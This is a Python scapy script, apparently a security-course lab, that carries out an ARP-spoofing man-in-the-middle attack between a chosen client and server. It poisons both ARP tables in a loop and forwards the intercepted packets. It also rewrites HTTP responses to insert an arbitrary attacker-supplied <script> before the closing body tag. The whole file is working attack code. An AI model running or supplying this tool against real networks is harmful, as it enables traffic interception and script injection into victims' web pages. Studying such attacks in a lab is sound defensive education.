# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *
from scapy.layers.http import HTTPResponse, HTTPRequest # import HTTP packet

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=IP), timeout=3, verbose=0)
    if ans:
        print("# IP: ", IP, " maps to MAC: ", ans[0][1].src)
        return ans[0][1].src
    print("# No mac found")
    return

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # TODO: Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    arp_response = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2)
    send(arp_response, verbose=False)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    arp_response = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2)
    send(arp_response, verbose=False)


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script
    
    valid_ips_to_mac = {
                clientIP: clientMAC,
                serverIP: serverMAC
            }

    if IP in packet and packet[Ether].src != attackerMAC:
        ip_src=packet[IP].src
        ip_dst=packet[IP].dst


        if HTTPResponse in packet and ip_src == serverIP and ip_dst == clientIP:
            html_string = packet[HTTPResponse][Raw].load.decode('utf-8')
            body_index = html_string.find('</body>')
            new_html_string = html_string

            if (body_index != -1):
                new_html_string = html_string[:body_index] + '<script>' + script + '</script>' + html_string[body_index:]
            
            packet[HTTPResponse][Raw].load = new_html_string.encode('utf-8')
            packet[HTTPResponse].Content_Length = str(len(new_html_string))

        if ip_src in valid_ips_to_mac and ip_dst in valid_ips_to_mac:
            packet[Ether].src = attackerMAC
            packet[Ether].dst = valid_ips_to_mac[ip_dst]
            del packet.chksum
            del packet[IP].chksum
            del packet[IP].len
            if TCP in packet:
                del packet[TCP].chksum
            sendp(packet)
    #    else:
    #        sendp(packet)
    #else:
    #    sendp(packet)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)
    script = args.script
    print("# inserting script:", script)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
